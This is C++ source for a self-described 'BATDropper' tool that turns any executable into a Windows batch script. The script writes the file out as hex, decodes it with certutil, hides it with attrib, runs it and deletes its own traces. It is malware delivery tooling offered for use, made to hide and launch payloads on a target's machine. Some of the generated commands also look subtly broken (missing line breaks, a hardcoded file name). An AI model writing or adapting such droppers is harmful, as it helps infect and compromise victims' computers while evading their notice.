#include "headers.h"

string ToHex(const string& s)
{
    ostringstream buffer;
    for(string::size_type i = 0; i < s.length(); ++i)
    {
        int ch = s[i] & 0xFF; // 255
        buffer << std::hex << std::setfill('0') << std::setw(2) << ch;
    }
    return buffer.str();
}

int main(int argc, char* args[])
{
    if (argc != 4)
    {
        cout << "Invalid Arguments.\nUsage: BATDropper.exe [input] [filename] [output].\n";
        return 0;
    }
    ifstream input(args[1], ios::in | ios::binary | ios::ate);
    ofstream output(args[3], ios::out);
    string hexs;
    if (!input.bad())
    {
        ifstream::pos_type size = input.tellg();
        char* memblock = new char[size];
        input.seekg(0, ios::beg);
        input.read(memblock, size);
        input.close();
        hexs = ToHex(string(memblock, memblock + size));
    }
    if (!output.bad())
    {
        output << "@echo off\necho ";
        for (size_t i = 0; i < hexs.size(); i++)
        {
            output << hexs[i];
            if (i == HEX_FILE_SZ)
            {
                output << ">" << HEX_FILE << "\necho ";
            }
            else if(i % HEX_FILE_SZ == 0 && i > HEX_FILE_SZ)
            {
                output << ">>" << HEX_FILE << "\necho ";
            }
        }
        output << ">>" << HEX_FILE;
        output << "\nattrib +h +s " << HEX_FILE << "\n";
        output << "powershell.exe -Command \"& {(Get-Content data.hex) -join '' | Set-Content data.hex; }\"\n";
        output << "call certutil -decodehex " << HEX_FILE << " " << args[2] << " >nul\n";
        output << "attrib +h +s " << args[2];
        output << "attrib -h -s " << HEX_FILE << "\n";
        output << "del " << HEX_FILE << "\n";
        output << "start " << args[2];
        output << "del " << args[3] << "\n";
        output.close();
    }
}